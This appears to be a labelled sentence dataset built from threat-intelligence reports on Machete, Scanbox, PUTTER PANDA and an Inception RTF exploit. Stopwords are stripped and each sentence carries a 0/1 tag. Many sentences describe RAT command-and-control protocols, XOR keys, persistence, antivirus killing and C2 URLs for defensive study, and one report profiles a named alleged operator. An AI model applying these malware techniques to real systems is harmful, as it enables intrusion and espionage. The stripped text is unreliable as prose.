Any communication must considered extremely suspicious Creates file Java Update.lnk pointing appdata / Jre6/java.exe Malware installed appdata/ MicroDes/ Running processes Creates Task Microsoft_up The first evidence language used victims attackers Spanish	0
The victims Spanish speaking according filenames stolen documents	0
The language also Spanish operators campaign find server side code written language reportes ingresar peso etc	0
The " Machete " discovery shows many regional players world targeted attacks	0
Unfortunately attacks became part cyber arsenal many nations located world	0
We sure parallel targeted attacks running Latin America regions	0
Kaspersky Lab products detect malicious samples related targeted attack Trojan- Spy Python Ragua	0
Note A full analysis Machete attacks available Kaspersky Intelligent Services customers	0
Contact intelreports@kaspersky.com	0
A days ago detected watering hole campaign website owned one big industrial company	0
The website related software used simulation system engineering wide range industries including automotive aerospace manufacturing	0
The attackers able compromise website include code loaded malicious Javascript file remote server	1
This Javascript file framework reconnaissance attackers call '' Scanbox '' includes techniques described previous blog post The Scanbox framework first configures remote C & C server use collects small amount information victim visiting compromised website including Resulting something like Before sending information C & C server Scanbox encodes encrypts data following function Producing following request If decrypt data translates After first request framework contains several plugins extract different information victim	1
While user browsing compromised website keystrokes recorded sent C & C periodically	1
It also send keystrokes user submits web forms potentially include passwords sensitive data	1
As seen powerful framework gives attackers lot insight potential targets help launching future attacks	0
We also seen several Metasploit-produced exploits target different versions Java IP address hosts Scanbox framework ( 122.10.9 [	0
] 109 )	0
In May 2014 U.S. Department Justice charged five Chinese nationals economic espionage U.S. corporations	0
The five known state actors officers Unit 61398 Chinese People 's Liberation Army ( PLA )	0
In response Chinese government stated claims '' absurd '' based '' fabricated facts ''	0
China went even stating '' The Chinese government Chinese military relevant personnel never engaged participated cyber theft trade secrets	0
'' We believe organizations governments corporations global domestic must keep pressure hold China accountable lasting change achieved	0
Not U.S. Government offer criminal indictment foundation evidence designed prove China 's culpability electronic espionage also illustrated charges tip large iceberg	0
Those reading indictment conclude People 's Republic China ( PRC ) hacking campaign limited five soldiers one military unit solely target United States government corporations	0
Rather China 's decade-long economic espionage campaign massive unrelenting	0
Through widespread espionage campaigns Chinese threat actors targeting companies governments every part globe	0
At CrowdStrike see evidence activity first-hand services team conducts Incident Response investigations responds security breaches largest organizations around world	0
We first-hand insight billions dollars intellectual property systematically leaving many largest corporations - often times unbeknownst executives boards directors	0
The campaign subject report points espionage activity outside Unit 61398 reveals activities Unit 61486	0
Unit 61486 12th Bureau PLA 's 3rd General Staff Department ( GSD ) headquartered Shanghai China	0
The CrowdStrike Intelligence team tracking particular unit since 2012 codename PUTTER PANDA documented activity dating back 2007	0
The report identifies Chen Ping aka cpyy primary location Unit 61486	0
This particular unit believed hack victim companies throughout world order steal corporate trade secrets primarily relating satellite aerospace communication industries	0
With revenues totaling $ 189.2 billion 2013 satellite industry prime target espionage campaigns result theft high-stakes intellectual property	0
While gains electronic theft hard quantify stolen information undoubtedly results improved competitive edge reduced research development timetables insight strategy vulnerabilities targeted organization	0
Parts PUTTER PANDA toolset tradecraft previously documented CrowdStrike open source referred MSUpdater group	0
This report contains details tactics tools techniques used PUTTER PANDA provides indicators signatures leveraged organizations protect activity	0
Our Global Intelligence Team actively tracks reports 70 espionage groups approximately half operate China believed tied Chinese government	0
This report part extensive intelligence library made available intelligence subscribers April 2014 prior US Government 's criminal indictment China 's subsequent refusal engage constructive dialog	0
Targeted economic espionage campaigns compromise technological advantage diminish global competition ultimately geographic borders	0
We believe U.S. Government indictments global acknowledgment awareness important steps right direction	0
In support efforts making report available public continue dialog around ever-present threat	0
CrowdStrike tracking activity cyber espionage group operating Shanghai China connections People 's Liberation Army Third General Staff Department ( GSD ) 12th Bureau Military Unit Cover Designator ( MUCD ) 61486 since 2012	0
The attribution provided report points Chen Ping aka cpyy ( born May 29 1979 ) individual responsible domain registration Command Control ( C2 ) PUTTER PANDA malware	0
In addition cpyy report identifies primary location Unit 61486	0
PUTTER PANDA determined adversary group conducting intelligence-gathering operations targeting Government Defense Research Technology sectors United States specific targeting US Defense European satellite aerospace industries	0
The PLA 's GSD Third Department generally acknowledged China 's premier Signals Intelligence ( SIGINT ) collection analysis agency 12th Bureau Unit 61486 headquartered Shanghai supports China 's space surveillance network	0
Domains registered Chen Ping used control PUTTER PANDA malware	0
These domains registered address corresponding physical location Shanghai headquarters 12th Bureau specifically Unit 61486	0
The report illuminates wide set tools use actors including several Remote Access Tools ( RATs )	1
The RATs used PUTTER PANDA actors conduct intelligence-gathering operations significant focus space technology sector	1
This toolset provides wide degree control victim system provide opportunity deploy additional tools	1
They focus exploits popular productivity applications Adobe Reader Microsoft Office deploy custom malware targeted email attacks	1
This report contains additional details tactics tools techniques used PUTTER PANDA provides indicators signatures leveraged organizations protect activity	0
➔ Putter Panda cyber espionage actor conducts operations Shanghai China likely behalf Chinese People 's Liberation Army ( PLA ) 3rd General Staff Department 12th Bureau Unit 61486	0
This unit supports space based signals  intelligence ( SIGINT ) mission	0
➔ The 12th Bureau Unit 61486 headquartered Shanghai widely accepted China 's primary SIGINT collection analysis agency supporting China 's space surveillance network	0
➔ This determined adversary group conducting intelligence- gathering operations targeting Government Defense Research Technology sectors United States specific targeting space aerospace communications	0
➔ They focus exploits popular productivity applications Adobe Reader Microsoft Office deploy custom malware targeted email attacks	1
➔ CrowdStrike identified Chen Ping aka cpyy suspected member PLA responsible procurement domains associated operations conducted Putter Panda	0
➔ The group operating since least 2007 observed heavily targeting US Defense European satellite aerospace industries	0
➔ There infrastructure overlap Comment Panda evidence interaction actors tied groups	0
There several pieces evidence indicate activity tracked CrowdStrike PUTTER PANDA attributable set actors based China operating behalf Chinese People 's Liberation Army ( PLA )	0
Specifically actor known cpyy ( Chen Ping ) appears involved number historical PUTTER PANDA campaigns time likely working Shanghai within 12th Bureau 3rd General Staff Department ( GSD )	0
PUTTER PANDA several connections actors infrastructure tied COMMENT PANDA group previously attributed Unit 61398 PLA	0
Although domains used command control tools described later report appear legitimate sites compromised way many appear originally registered operators	1
Table 1 shows domains appear registered actors original email address used known	0
The significant finding actor known cpyy appears registered significant number C2 domains	0
This actor discussed next section	0
Many domains registrant information changed likely attempt obfuscate identity operators	0
For instance several domains originally registered cpyy email address updated van.dehaim @ gmail.com around end 2009 ; siseau.com change occurred July 2009 November 2009 vssigma.com change occurred August 2009 December 2009	0
Historical registrant information anfoundation.us rwchateau.com succourtion.org available prior 2010 likely domains also originally registered personally attributable email account	0
Similarly several domains registered mike.johnsonmj @ yahoo.com registrant email updated March 2014 ( see Table 2 )	0
These registrant changes may indicate increased awareness operational security ( OPSEC ) PUTTER PANDA actors	0
The recent changes domains shown Table 2 may indicate operators preparing new campaigns make use infrastructure attempting disassociate	0
Although attributable information found email addresses associated domains described ( aside cpyy httpchen – see ) several domains found registered addresses	0
These shown Table 3 may used command control PUTTER PANDA tools	1
domains single email address perhaps due OPSEC concerns issues specific email account	0
The subdomains associated domains via DNS records along domain names point areas interest PUTTER PANDA operators ( see also Droppers following Technical Analysis section ) • Space satellite remote sensing technology ( particularly within Europe ) ; • Aerospace especially European aerospace companies ; • Japanese European telecommunications	0
It likely PUTTER PANDA continue attack targets nature future intelligence- gathering operations	0
Based passive DNS records several PUTTER PANDA associated domains resolved IP address 100.42.216.230 Additionally several subdomains ujheadph.com resolved IP Another subdomain ujheadph.com observed connection distinctive traffic originating 3PARA RAT ( described ) making probable domain also associated PUTTER PANDA	0
The decipherment.net domains resolved IP address 11 October 2012 least 25 February 2013 botanict.com domain resolved 11 October 2012 24 March 2013	0
During part timeframe ( 30 June 2012 - 30 October 2012 ) domain associated COMMENT PANDA resolved IP address login	0
aolon1ine.com	0
Additionally brief period April 2012 update8.firefoxupdata.com also resolved IP address	0
The use IP address time suggests perhaps cooperation shared resources COMMENT PANDA PUTTER PANDA	0
Although conclusive links COMMENT PANDA IP address 31.170.110.163 associated VIXEN PANDA domain blog	0
strancorproduct.info November December 2013	0
In February 2014 IP address also associated PUTTER PANDA domain ske.hfmforum	0
com	0
While directly overlapping potential infrastructure link interesting VIXEN PANDA previously displayed TTPs similar COMMENT PANDA ( CrowdStrike reporting describes VIXEN PANDA malware extracts C2 commands embedded delimiters web content ) extensively targeted European entities	0
11 Several email addresses associated cpyy also appears use alternate handles cpiyy cpyy.chen The cpyy.net domain lists '' Chen Ping '' registrant name may cpyy 's real name correlates initials '' cp '' '' cpyy ''	0
A personal blog cpyy found http //cpiyy.blog.163.com/	0
The profile blog ( shown Figure 2 ) indicates user male born 25 May 1979 works '' military/police '' ( 其他- 军人/警察 )	0
This blog contains two postings '' IT '' category indicate least passing interest topics networking programming	0
A related CSDN profile user cpiyy indicates cpyy working studying topics 2002 2003	0
Another personal blog cpyy ( http //www.tianya.cn/1569234/bbs ) appears last updated 2007	0
This states user lives Shanghai birthdate identical 163.com blog	0
cpyy also active social networking site called XCar stating lived Shanghai early 2005 2007 ; said post '' Soldier 's duty defend country long country safe military excellent '' indicating feeling patriotism could consistent someone chose military police-based career	0
On XCar forum cpyy.chen used subforum called POLO ( hacker slang '' Volkswagen cars '' ) communicate users Linxder peggycat '' Naturally understand romance '' ( 天生不懂浪漫 ) '' wolf '' ( 一只大灰狼 ) '' large tile '' ( 大瓦片 ) '' winter '' ( 冬夜 ) '' chunni '' ( 春妮 ) papaya kukuhaha Cranbing '' dusty sub '' ( 多尘子 ) z11829 '' ice star harbor '' ( 冰星港 ) '' polytechnic Aberdeen '' ( 理工仔 ) '' I love pineapple pie '' ( 我爱菠罗派 ) '' 's distant '' 2007	0
Although superficially discussion cars repeated word text '' milk yellow package '' '' custard package '' '' yoke package '' ( 奶黄包 )	0
This could hacker slang word unclear definition	0
The conversation alludes Linxder '' teacher '' '' landlord '' aforementioned users '' students ''	0
Linxder references '' found jobs ''	0
It possible reference hacking jobs wrapped car metaphors	0
Linxder handle actor associated likely Shanghai-based COMMENT PANDA group	0
Linxder cpyy xiaobai discussed programming security related topics cpyy 's site cpyy.org hosted discussion forum 711 Network Security Team ( see )	0
cpyy also appears keen interest photography ; 163.com blog includes several photographs taken cpyy blog postings albums section	0
Some photographs also appear Picasa site ( examples shown Figures 5 6 ) belonging user cpyy.chen	0
An album site named '' '' several shots likely cpyy 2005 2006 2007 shown right An account rootkit.com popular low-level software security site existed user cpyy accessed least May 2004	0
This account registered primary email address cpyy @ cpyy.net backup email address cpyy @ hotmail.com ; listed date birth 24 May 1979 consistent cpyy 's profiles	0
The IP address 218.242.252.214 associated account ; owned Oriental Cable Network Co. Ltd. ISP located Shanghai	0
Registration forum shows cpyy interest security-related programming topics backed postings personal blog CSDN account	0
One sites registered cpyy used host web-based email service along forum www	0
cpyy.net	0
Both services apparently run 711 Network Security Team ( 711网络安全小组 ) group likely defunct previously published security-based articles re-posted popular Chinese hacking sites xfocus.net	0
One articles entitled '' IMD-based packet filtering firewall achieve principles '' apparently authored xiaobai email address xiaobai @ openfind.com.cn ; published '' GRATEFUL '' ( 饮水思源 ) security digest list hosted Shanghai Jiao Tong University ( SJTU )	0
This digest list/bulletin board also frequented ClassicWind actor possibly linked Shanghai-based PLA-sponsored adversary group COMMENT PANDA described	0
This Tipper also indicates '' Chinese Communist Party ( CCP ) People 's Liberation Army ( PLA ) aggressively target SJTU School Information Security Engineering ( SISE ) source research student recruitment conduct network offense defense campaigns '' possible 711 Network Security Team members came attention Chinese state via institution	0
An additional connection SJTU comes C2 domain checalla.com used 4H RAT 2008	0
This domain registered httpchen @ gmail	0
com time address also used make posting GRATEFUL BBS ( shown Figure 7 )	0
The posting indicates httpchen located 闵行 ( Minhang ) campus SJTU posting using IP address 58.196.156.15 associated China Education Research Network ( CERNET ) nationwide network managed Chinese Ministry Education	0
It also states httpchen studying school Information Security Engineering within SJTU	0
Several pieces evidence indicate cpyy probably connections part Chinese military – specifically PLA Army	0
In addition declaration personal blog works '' military/ police '' contacts actors Linxder previously associated hacking units within PLA cpyy 's Picasa site contains several photographs hint military connections	0
First monochrome picture 大学时代 ( '' college '' ) album posted February 2007 shows several uniformed individuals It clear whether picture includes cpyy friends/ associates/relatives	0
A picture 中学时代 ( '' high school '' ) album posted February 2007 shows male – likely cpyy based clothing shown second picture matches pictures cpyy shown – performing exercise front group likely soldiers officer Although somewhat unclear pictures album 2002年的生日 ( '' 2002 birthday '' ) also posted February 2007 show celebrant ( likely cpyy ) khaki clothes possibly military wear	0
The compelling pictures however found 宿舍 办公室 albums ( '' dormitory '' '' office '' )	0
A shot probably cpyy 's dormitory room shows background two military hats appear Type 07 PLA Army officer peak hats 18 This album also contains shot exterior building several large satellite dishes outside This building satellite dishes also appear '' office '' album	0
The reflection effects observed windows building could due coatings applied resist eavesdropping via laser microphones increase privacy would consistent military installation conducting sensitive work	0
Above image album appears larger dish front Oriental Pearl Tower significant landmark Shanghai As mentioned checalla.com used command control PUTTER PANDA 4H RAT 2008	0
This domain registered httpchen @ gmail.com May 2009 domain registration details updated include Registrant Address '' shanghai yuexiulu 46 45 202 # ''	0
A search location reveals area Shanghai shown Figure 8	0
Figure 9 shows enlargement satellite imagery within area depicting facility containing several satellite dishes within green areas sports courts large office building	0
Satellite imagery 2009 showing another aspect office building along likely vantage point direction camera alongside probably cpyy 's photograph angle shown Figure 10 Based Shanghai location common features highly likely location shown photographed cpyy shown '' office '' '' dormitory '' albums	0
Further confirmation found photos uploaded user Panoramio tags image located Chabei Shanghai China ( 31° 17 ' 18.86 '' N 121° 27 ' 9.83 '' E )	0
This image exceptionally similar building shown cpyy 's '' office '' album ( see Figure 11 )	0
According public report Chinese PLA 's General Staff Department ( GSD ) 12th Bureau 3rd GSD headquartered Zhabei district Shanghai '' appears functional mission involving satellites likely inclusive intercept satellite communications possibly space-based SIGINT collection ''	0
The report also lists Military Unit Cover Designator ( MUCD ) 61486 bureau	0
A webpage published Chinese government site detailing theatrical performances involving members PLA lists address '' 闸北区粤秀路46号 '' ( 46 Yue Xiu Road Zhabei District ) '' 总参61486部队 '' ( 61486 Forces General Staff )	0
A search location shows identical area shown Figure 8	0
It therefore concluded high confidence location shown cpyy 's imagery along satellite images headquarters 12th Bureau 3rd GSD Chinese PLA – also known Unit 61486	0
This unit 's suspected involvement '' space surveillance '' '' intercept satellite communications '' fits observed targeting preferences Western companies producing technologies space imaging/remote sensing sectors	0
The size number dishes present area also consistent activities	0
Observed build times PUTTER PANDA tools described report range 2007 late 2013 indicating actors conducted several campaigns objectives period several years	0
A build time analysis known samples shown Figure 1 relative China time	0
Although shows bias build time distribution daylight working hours China significant possible three-shift system hours considered ( 0900-1200 1400-1700 2000-2300 ) evidence conclusive	0
There also evidence build times manipulated adversary ; example sample MD5 hash bc4e9dad71b844dd3233cfbbb96c1bd3 build time 18 July 2013 supposedly first submitted VirusTotal 9 January 2013	0
This shows attackers – least 2013 – aware operational security considerations likely taking deliberate steps hide origins	0
There strong evidence tie cpyy actor appears involved historical PUTTER PANDA operations PLA army location Shanghai operated 12th Bureau 3rd GSD PLA ( Unit 61486 )	0
Another actor tied activity httpchen declared publically attending School Information Security Engineering SJTU	0
This university previously posited recruiting ground PLA find personnel cyber intelligence gathering units circumstantial evidence linked cpyy actors based SJTU	0
Given evidence outlined CrowdStrike attributes PUTTER PANDA group PLA Unit 61486 within Shanghai China high confidence	0
It likely organization staffed part current former students SJTU shares resources direction PLA Unit 61398 ( COMMENT PANDA )	0
Several RATs used PUTTER PANDA	1
The common 4H RAT 3PARA RAT documented previously CrowdStrike previous CrowdStrike Intelligence reporting	0
This analysis revisited along examination two PUTTER PANDA tools pngdowner httpclient	0
Two droppers associated PUTTER PANDA toolset ; also briefly examined	1
This RAT first analyzed CrowdStrike April 2012 historical analysis shows use since least 2007 PUTTER PANDA actors	0
A listing metadata known samples including C2 information shown Appendix 1	0
The operation RAT described detail CrowdStrike reporting useful revisit highlight characteristics RAT • C2 occurs HTTP connectivity verified making distinctive request ( URI / search ? qu= www.google.com )	1
• A victim identifier generated infected machine 's hard disk serial number XOR'ed key ldd46 yo finally nibble-wise encoded upper-case ASCII characters range ( A-P ) – e.g. byte value 0x1F becomes '' BP ''	1
• A series HTTP requests characterizes RAT 's C2	1
The initial beacon uses request four parameters ( h1 h2 h3 h4 ) – shown Figure 8 – register implant C2 server	1
• Communication C2 server obfuscated using 1-byte XOR key 0xBE	1
• The commands supported RAT enable several capabilities including The 3PARA RAT described detail CrowdStrike reporting examined DLL-based sample exported filename ssdpsvc.dll	1
Other observed exported filenames msacem.dll mrpmsg.dll although RAT also observed plain executable ( EXE ) format	0
On startup RAT attempts create file mapping named & *SDKJfhksdf89*DIUKJDSF & *sdfsdf78sdfsdf	1
This used prevent multiple instances RAT executed simultaneously	1
The RAT use byte-wise subtraction- based algorithm ( using hard-coded modulo value ) decode C2 server details consisting server hostname port number example nsc.adomhn com port 80	1
The decoding algorithm illustrated Figure 10	0
The key modulo values vary per-sample basis	0
Decoded C2 settings along sample metadata listed Appendix 2	0
The RAT programmed C++ using Microsoft Visual Studio makes use object-oriented parallel programming features environment ; Standard Template Library ( STL ) objects used represent data structures strings lists custom objects used represent C2 command handlers ( e.g. CCommandCMD )	0
Several threads used handle different stages C2 protocol receiving data server decrypting data processing commands	1
Standard Windows primitives Events used synchronize across threads shared global structure used hold state	0
Once running RAT load binary representation date/time value file C \RECYCLER\restore.dat sleep date/time passed	1
Database provides mechanism operators allow RAT remain dormant fixed time perhaps allow means regaining access parts toolset removed victim system	1
As 4H RAT C2 protocol used 3PARA RAT HTTP based using GET POST requests	1
An initial request made C2 server ( illustrated Figure 11 ) response value effectively ignored ; likely request serves connectivity check C2 activity occur first request successful	1
In case RAT transmit basic victim information C2 server along 256-byte hash hard-coded string HYF54 & % 9 & jkMCXuiS	1
It likely request functions means authenticate RAT C2 server register new victim machine controller	1
A sample request structure shown Figure 12	0
If request also successful RAT attempt retrieve tasking controller using distinctive HTTP request shown Figure 13 repeating request every two seconds valid tasking returned	1
Returned tasking decrypted using DES algorithm CBC mode key derived MD5 hash string HYF54 & % 9 & jkMCXuiS ( used secondary beacon shown )	0
If fails RAT fall back decoding data using 8-byte XOR key derived data returned HashData API key string	0
Output data produced tasking instructions encrypted manner decrypted sent back C2 server via HTTP POST request URI form /microsoft/errorpost/ default.aspx ? ID= ID value random number decimal representation – initial request shown Figure 4	1
The set commands supported RAT somewhat limited indicating perhaps RAT intended used second-stage tool failsafe means attackers regain basic access compromised system ( consistent support sleeping certain date/time )	1
Some supported commands implemented using C++ classes derived base CCommand class •C CommandAttribe – Retrieve metadata files disk set certain attributes creation/ modification timestamps	0
• CCommandCD – Change working directory current C2 session	0
•C CommandCMD – Execute command standard input/output/error redirected C2 channel	0
• CCommandNOP – List current working directory	0
However commands implemented way	0
These commands contain functionality • Pause C2 activity random time interval	0
• Shutdown C2 activity exit	0
•P rovide date time beaconing resume recorded file C \RECYCLER\ restore.dat noted	0
The use C++ classes inherit base class carry tasking commands along use concurrency features indicates developers RAT put thought architecture design tool although decision implement commands outside class-based framework curious may indicate multiple developers worked RAT ( single developer shifting preferences coding style )	0
The pngdowner malware simple tool constructed using Microsoft Visual Studio implemented via single C++ source code file	0
This sample contains PDB path Y \Visual Studio 2005\Projects\branch-downer\ downer\Release\downer.pdb similar paths Z \Visual Studio 2005\Projects\pngdowner\Release\ pngdowner.pdb Z \Visual Studio 2005\Projects\downer\Release\downer.pdb also observed samples	0
Appendix 3 lists metadata known pngdowner samples	0
Initially malware perform connectivity check hard-coded URL ( http //www.microsoft.com ) using constant user agent Mozilla/4.0 ( Compatible ; MSIE 6.0 ; )	1
If request fails malware attempt extract proxy details credentials Windows Protected Storage IE Credentials Store using publicly known methods15 using proxy credentials subsequent requests enable outbound HTTP access	1
An initial request made hard-coded C2 server initial URI – forming URL form ( sample ) http //login.stream-media.net/files/xx11/index.asp ? 95027775 numerical parameter represents random integer	1
A hard-coded user agent myAgent used thisrequest subsequent communication C2 server	0
Content returned request C2 server saved file named index.dat user's temporary directory ( i.e. % TEMP % )	0
This file expected contain single line specifying URL filename	0
The malware attempt download content specified URL filename within user 's temporary directory execute file via WinExec API	1
If execution attempt succeeds final C2 request made – case URL using path initial request ( similarly random parameter ) filename success.asp	1
Content returned request saved file immediately deleted	0
Finally malware delete content saved first request exit	1
The limited functionality lack persistence tool implies used simple download- and-execute utility	1
Although version mentioned uses C++ along Visual Studios Standard Template Library ( STL ) older versions RAT ( MD5 hash b54e91c234ec0e739ce429f47a317313 ) built 2011 use plain C. This suggests despite simple nature tool developers made attempts modify perhaps modernize code	0
Both versions contain debugging/progress messages '' file success ''	0
Although displayed victim likely used developers simple means verify functionality code	0
Like pngdowner httpclient malware simple tool provides limited range functionality uses HTTP C2 channel	1
This malware also initially performs connectivity check www.microsoft.com using hard-coded user agent Mozilla/4.0 ( Compatible ; MSIE 6.0 ; ) although variant attempt made extract proxy credentials	1
The malware connect configured C2 infrastructure ( file.anyoffice.info ) perform HTTP request form shown Figure 14 Content returned C2 server deobfuscated XOR'ing content single byte 0x12	1
The decoded data checked string runshell	0
If string present C2 request repeated every 0.5 seconds	1
Otherwise shell process started ( i.e. cmd.exe ) input/output redirected C2 channel	1
Shell commands server followed encoded string $ $ $ indicates shell session continue	0
If session ended two commands supported m2b ( upload file ) b2m ( download file )	1
Slight variations C2 URLs used different phases C2 interaction Given lack persistence mechanism low level sophistication likely httpclient – like pngdowner – used second-stage supplementary/backup tool	0
Appendix 4 lists metadata observed httpclient samples	0
Other CrowdStrike reporting describes dropper used PUTTER PANDA ( abc.scr ) install 4H RAT	1
This dropper uses RC4 decrypt embedded payload data embedded resource writing payload disk executing	1
Several instances dropper observed commonly association 4H RAT also relation tools described forthcoming reporting	0
Another dropper observed exclusively installing pngdowner malware ( example MD5 hash 4c50457c35e2033b3a03fcbb4adac7b7 )	1
This dropper simplistic nature compiled single C++ source code file	0
It contains Word document plaintext ( written BienvenueaSahajaYogaToulouse	0
doc ) along executable ( Update.exe ) DLL ( McUpdate.dll )	0
The executable DLL contained within .data	1
section dropper obfuscated 16-byte XOR key ( consisting bytes 0xA0 – 0xAF )	1
Both document executable written disk executed via ShellExecute API ( using verb '' open '' )	1
The executable also installed ASEP registry key HKCU\Software\Microsoft\Windows\ CurrentVersion\Run value named McUpdate	1
Finally dropper deletes via batch file	1
The dropped executable ( MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d ) primarily aims inject specified DLL ( McUpdate.dll MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f ) process would normally accessing network likely order disguise malicious activity	1
Module names corresponding Outlook Express ( msinm.exe ) Outlook ( outlook.exe ) Internet Explorer ( iexplore.exe ) Firefox ( firefox.exe ) used	0
If Internet Explorer used malware attempt terminate processes corresponding two components Sophos Anti-Virus ( SAVAdminService.exe SavService.exe )	1
Four examples droppers located using mixture decoy PDF Microsoft Word documents ( shown Figures 15-18 )	1
The common theme throughout documents space technology ( BienvenueaSahajaYogaToulouse.doc follow trend could targeted workers Toulouse Space Centre '' largest space centre Europe '' ) indicating attackers keen interest sector also reflected choice name C2 domains used ( see Attribution section )	0
A number specific generic detection methods possible RAT host network	0
These detailed designed expand upon indicators reported CrowdStrike reporting	0
The following Windows registry artifacts indicative compromised host redacted ) The presence following file system artifacts indicative compromised host A file mapping named & *SDKJfhksdf89*DIUKJDSF & *sdfsdf78sdfsdf also indicates victim machine compromised PUTTER PANDA malware	0
In addition domains listed Appendices Attribution section generic signatures used detect activity malware described report	0
In addition indicators described PUTTER PANDA distinct generic TTPs PUTTER PANDA determined adversary group operating several years conducting intelligence-gathering operations significant focus space sector	0
Although tools simplistic taken whole toolset provides wide degree control victim system provide opportunity deploy additional tools	1
Research presented report shows PUTTER PANDA operators likely members 12th Bureau 3rd General Staff Department ( GSD ) People 's Liberation Army ( PLA ) operating unit 's headquarters Shanghai MUCD 61486	0
Strategic objectives unit likely include obtaining intellectual property industrial secrets relating defense technology particularly help enable unit 's suspect mission conduct space surveillance remote sensing interception satellite communications	0
PUTTER PANDA likely continue aggressively target Western entities hold valuable information intellectual property relevant interests	0
The detection mitigation guidance given report help minimize risk successful compromise actors future CrowdStrike reports examine elements PUTTER PANDA toolset	0
CrowdStrike Falcon Intelligence portal provides enterprises strategic customized actionable intelligence	0
Falcon Intelligence enables organizations prioritize resources determining targeted versus commodity attacks saving time focusing resources critical threats	0
With unprecedented insight adversary tools tactics procedures ( TTPs ) multi-source information channels analysts identify pending attacks automatically feed threat intelligence via API SIEM thirdparty security tools	0
Access CrowdStrike Falcon Intelligence geared toward levels organization executivewho needs understand business threat strategic business impact front-line securiyt professional struggling ght adversary's attack enterprise	0
CrowdStrike Falcon Intelligence web-based intelligence subscription includes full access variety feature sets including CrowdStrike Falcon Host endpoint threat detection response product identifies unknown malware detects zero-day threats prevents damage targeted attacks real-time	0
Falcon Host comprised two core components cloud-based management console on-premises host-based sensor continuously monitors threat activity endpoint prevent damage real-time	0
Falcon Host leverages lightweight kernel-mode sensor shadows captures correlates low- level operating system events instantly identify adversary tradecraft activities Stateful Execution Inspection ( SEI ) endpoint Machine Learning cloud	0
As opposed focusing malware signatures indicators compromise exploits vulnerabilities Falcon Host instead identifies mission objectives adversary leveraging Kill Chain model provides realtime detection focusing attacker opposed looking nfor specific easily changeable indicator used attack	0
Without performing intrusive performance- impacting scans system Falcon Host 's highly efficient real-time monitoring system activity security solution provides maximum visibility adversary activities including Adversary-in-Motion reconnaissance exploitation privilege escalation lateral movement exfiltration	0
Falcon Host delivers insight past current attacks single host also across devices networks	0
Stateful Execution inspection Stateful Execution Inspection ( SEI ) tracks execution state links together various stages kill chain initial code execution data exfiltration	0
CrowdStrike 's Real-time Stateful Execution Engine performs inspection analysis understand full context cyber attack	0
SEI critical understanding entire attack life cycle preventing damage advanced malware targeted attacks	0
Existing security technologies focus solely malware signatures incidators compromise exploits vulnerabilities fail protect majority attacks blind full scope adversary activity	0
CrowdStrike global provider security technology services focused identifying advanced threats targeted attacks	0
Using big-data technologies CrowdStrike 's next-generation threat protection platform leverages real-time Stateful Execution Inspection ( SEI ) endpoint Machine Learning cloud instead solely focusing malware signatures indicators compromise exploits vulnerabilities	0
The CrowdStrike Falcon Platform combination big data technologies endpoint security driven advanced threat intelligence	0
CrowdStrike Falcon enables enterprises identify unknown malware detect zero-day threats pinpoint advanced adversaries attribution prevent damage targeted attacks real time	0
CrowdStrike Services wholly owned subsidiary CrowdStrike responsible proactively defending responding cyber incidents pre post Incident Response services	0
CrowdStrike 's seasoned team Cyber Intelligence professionals Incident Responders Malware Researchers consists number internationally recognized authors speakers experts worked publicized challenging intrusions malware attacks recent years	0
The CrowdStrike Services team leverages Security Operations Center monitor full CrowdStrike Falcon Platform provide cutting-edge advanced adversary intrusion detection services	0
The full spectrum proactive response services helps customers respond tactically well continually mature strategically evolve Incident Response program capabilities	0
After reading Inception paper Snorre Fagerland Waylon Grange I got curious threat reversing	0
I felt would good write technical blog process - maybe could helpful interesting	0
RTF file Analysis MD5 4a4874fa5217a8523bf4d1954efb26ef Exploit CVE-2012 - 0158 As see following screen shot RTF [ Rich Text Format ] file	0
Its common attackers use document files bait	0
It common shellcode starts NOPsled	0
In following screenshot see embedded shellcode starts NOP slide	0
NOP No OPeration - single - byte opcode nothing	0
It hex value 0x90	0
Now functionality shellcode	0
We ignore first two prolog instructions remaining statements I inserted comments help understanding happening chunk code	0
It 's traversing TEB PEB Ldr structure get base addresses ntdll.dll kernel32.dll	0
It needs find API addresses requires rest infection	0
In screenshot Function 00120F82 malware 's GetProcAddress function takes two parameters The function returns memory address API	0
As shown next screenshot function parses " export name pointer table " .dll [ ex	0
kernel32.dll ] generates hash function	0
It compares argument API hash ( Ex DF7D9BAD GetFileSize see screenshot ) using CMP EDI ESI instruction	0
Once matching API found parses Export Address Table returns respective API address caller EAX register	0
The document contains two levels shellcode	0
We analyzing first level following code see typical egghunting method It attempts open already opened rtf file checking file handles memory	0
It starts handle value 4 verifies GetFileSize	0
If fails ADD ESI,4 ( adds 4 handle ) API succeeds	0
When happens checks file offset 0x8300 marker 0x54405450	0
Again matches allocates memory reads file content jumps 2nd level shellcode JMP EBX	0
Now landed second level shellcode obfuscated evade static analysis	1
At initial stage instructions waiting help us	0
This deobfuscation code	0
We see 0x23B * 4 number bytes obfuscated POP EBX get EIP instruction 0x5687F945 deobfuscation XOR key	0
In following code see hexadecimal value corresponds library name pushed LoadLibrary function well two loops get API addresses using " CALL 02E203E2 " function	0
Here also uses hashes look APIs	0
In following code searches embedded VBS file inside RTF file memory	0
It checks file size loop size larger 0x2000 sets file ponter 0x8C14 compare VBS file marker see following screenshot	0
After finding VBS marker memory decrypts VBS file two iterations	0
In first loop decrypts second loop swaps low high bytes first 0x100 16-bit words writes file file named " Temp / ew_Rg.vbs "	0
The following screenshot shows part .VBS payload file dropped .RTF file	0
First line encrypted .dll 4th line contains Key decrypt .dll	0
Remaining part self - explanatory	0
The instruction c = Crypt(c k ) function decrypts encrypted dll returns decrypted dll	0
( See screenshot ) c= encrypted dll	0
k = decryption key	0
Following function writes byte byte dropped.dll file	0
Finally following code executes " regsvr32 " command run wmiprvse.dll silent mode sets run key registry	0
This first level deobfuscation wmiprvse.dll takes around 3 - 4 minutes finish	0
Then allocates memory using VirtualAlloc writes unpacked code newly allocated memory jumps unpacked code shown following screen shot	0
This dll 3 layers unpacking	0
The one level one iyou see level two	0
We see passing control newly unpacked .dll @CALL EAX	0
It 's time - consuming understand functionality dll decrypts builds runtime import table hinder analysis	1
Analyst directly see API gets called	0
Finally see 's connecting webdav.cloudme.com cleartext credentials following screenshot	1
Malware tries communicate user account created WebDAV C&C exfiltrate system user information	1
Reference	0
https://www.bluecoat.com / security - blog/2014 - 12 - 09/blue - coat - exposes-%E2%80%9C- inception - framework%E2%80%9D - - sophisticated - layered - malware	0
One questions comes months big security whitepaper disclosures ? In words happened operators tools infrastructure revealed reports blog-posts press interviews	0
